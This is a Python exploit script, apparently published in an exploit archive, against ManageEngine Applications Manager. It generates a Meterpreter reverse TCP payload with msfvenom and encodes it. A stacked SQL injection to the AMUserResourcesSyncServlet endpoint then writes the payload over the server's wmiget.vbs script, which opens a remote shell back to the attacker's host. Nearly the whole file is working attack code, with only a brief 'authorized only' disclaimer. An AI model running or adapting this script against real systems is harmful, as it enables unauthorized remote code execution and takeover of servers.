#!/usr/bin/env python3

# Exploit Title: Manage Engine SQLi to RCE using the wmiget.vbs to trigger the shell
# Date: 2021-02-22
# Exploit Author: 0xAlmighty
# Blog: http://0xalmighty.github.io
# GitHub: https://github.com/0xalmighty
# Twitter: https://twitter.com/0xalmighty
# Email: MHhhbG1pZ2h0eUBwcm90b25tYWlsLmNvbQ==
# Exploit the SQLi in ForMasRange=1&userId=1 and replace wmiget.vbs to get a shell. I provided the one-liner and the full wmiget.vbs script in case you need them (mostly for backups) 
# Test only if you're authorized, be smart.                 
# Example usage: python3 tutorpass.py -target DOMAIN/IP

import requests
import urllib3
import time
import sys
import os
import subprocess
import base64
import urllib.parse
from subprocess import call

# Cool banner
banner = '''\033[1;35m
 ██████╗   █████╗  ██╗    ██╗ ███╗   ██╗ ███████╗ ███╗   ██╗  ██████╗  ██╗ ███╗   ██╗ ███████╗
 ██╔══██╗ ██╔══██╗ ██║    ██║ ████╗  ██║ ██╔════╝ ████╗  ██║ ██╔════╝  ██║ ████╗  ██║ ██╔════╝
 ██████╔╝ ███████║ ██║ █╗ ██║ ██╔██╗ ██║ █████╗   ██╔██╗ ██║ ██║  ███╗ ██║ ██╔██╗ ██║ █████╗
 ██╔═══╝  ██╔══██║ ██║███╗██║ ██║╚██╗██║ ██╔══╝   ██║╚██╗██║ ██║   ██║ ██║ ██║╚██╗██║ ██╔══╝
 ██║      ██║  ██║ ╚███╔███╔╝ ██║ ╚████║ ███████╗ ██║ ╚████║ ╚██████╔╝ ██║ ██║ ╚████║ ███████╗
 ╚═╝      ╚═╝  ╚═╝  ╚══╝╚══╝  ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═══╝  ╚═════╝  ╚═╝ ╚═╝  ╚═══╝ ╚══════╝
\t\033[1;39mTwitter @0xalmighty\t\t\t\t\033[1;37mᴵⁿᵛᶦˢᶦᵇˡᵉ ᵗʰᶦⁿᵍˢ ᵃʳᵉ ᵗʰᵉ ᵒⁿˡʸ ʳᵉᵃˡᶦᵗᶦᵉˢ
'''

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

timeout = 3

# Create shell and append to vbs script, text manipulation to fix the shell
def do_stuff(lhost, lport):
    print (f'\033[1;31m(+) Creating the shell, please wait...\033[0m')
    time.sleep(2)
    output = subprocess.check_output("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -e x86/shikata_ga_nai -f vbs", shell=True)
    print (f'\033[1;32m(+) Shell successfully created!\033[0m')
    time.sleep(2)
    with open("shell.vbs", "ab") as f:
         f.write(output)
         f.close()
    print (f'\033[1;33m(+) Fixing the shell, text manipulation incoming!\033[0m')
    time.sleep(2)
    indent = subprocess.call("sed 's/^[ \t]*//' shell.vbs > indent.vbs", shell=True)
    no_space = subprocess.call("sed '/^$/d' indent.vbs > nospace.vbs", shell=True)
    add_char_end = subprocess.call("sed -i s/$/:/ nospace.vbs", shell=True)
    remove_line_2_end = subprocess.call("sed -i '2 s/._://' nospace.vbs", shell=True)
    remove_line_3_end = subprocess.call("sed -i '3 s/._://' nospace.vbs", shell=True)
    remove_line_32_end = subprocess.call("sed -i '32 s/.://' nospace.vbs", shell=True)
    add_space_line_2 = subprocess.call("sed '2s/$/ /' nospace.vbs > 2space.vbs", shell=True)
    add_space_line_2 = subprocess.call("sed '3s/$/ /' 2space.vbs > 3space.vbs", shell=True)
    strip = subprocess.call("cat 3space.vbs | tr -d '\n' | tr -d '\t' > wmiget.vbs", shell=True)
    del_shell_file = subprocess.call("rm shell.vbs", shell=True)
    del_shell_file2 = subprocess.call("rm indent.vbs", shell=True)
    del_shell_file3 = subprocess.call("rm nospace.vbs", shell=True)
    del_shell_file4 = subprocess.call("rm 2space.vbs", shell=True)
    del_shell_file5 = subprocess.call("rm 3space.vbs", shell=True)
    print (f'\033[1;31m(+) Writing the shell to the wmiget.vbs file...\033[0m')
    time.sleep(2)
    print (f'\033[1;32m(+) Successfully added the shell to the VBS file!\033[0m')
    time.sleep(2)

def urlencode(str):
  return urllib.parse.quote(str)

def send_exploit(host):
    print (f'\033[1;31m(+) Encoding the content of the VBS file...\033[0m')
    time.sleep(2)
    with open("wmiget.vbs", "rb") as binary_file:
        binary_file_data = binary_file.read()
        base64_encoded_data = base64.b64encode(binary_file_data)
        base64_message = base64_encoded_data.decode('utf-8')
        print (f'\033[1;32m(+) Successfully encoded the file!\033[0m')
        str = (base64_message)
        encoded = urlencode(str)
        sqli = "ForMasRange=1&userId=1;copy+(select+convert_from(decode($$" + encoded + '$$,$$base64$$),$$utf-8$$))+to+$$C:\\\Program+Files+(x86)\\\ManageEngine\\\AppManager12\\\working\\\conf\\\\\\\\application\\\scripts\\\wmiget.vbs$$;--+'
        headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded"
                }

        print (f'\033[1;31m(+) Sending the payload to the target...\033[0m')
        time.sleep(2)
        url = "https://" + host + ":8443/servlet/AMUserResourcesSyncServlet"
        r = requests.post(url, headers=headers, data=sqli, verify=False)
        print (f'\033[1;32m(+) Successfully delivered the payload!\033[0m')

def main():

    from argparse import ArgumentParser
    parser = ArgumentParser(description='\033[1;31mNeed help?')
    parser.add_argument('-target', help='Domain or IP')
    parser.add_argument('-lhost', help='Your IP')
    parser.add_argument('-lport', help='Your Port')

    args = parser.parse_args()

    if args.target:
        host = str(args.target)

    if args.lhost:
        lhost = str(args.lhost)

    if args.lport:
        lport = str(args.lport)

    if len(sys.argv) < 2:
        print(f'{banner}\n')
        print(f'\t\033[93mI will exploit the SQLi and give you a shell, use it if you have permission only!\n')
        print(f'\t\033[1;31mUsage:\033[1;37m python3 {sys.argv[0]} -target DOMAIN\n')
        print(f'\t\033[1;31mNeed help?\n')
        print(f'\t\033[1;31mTry: \033[1;37mpython3 {sys.argv[0]} --help\n')
        sys.exit(0)

    do_stuff(lhost, lport)
    send_exploit(host)

if __name__ == "__main__":
    main()

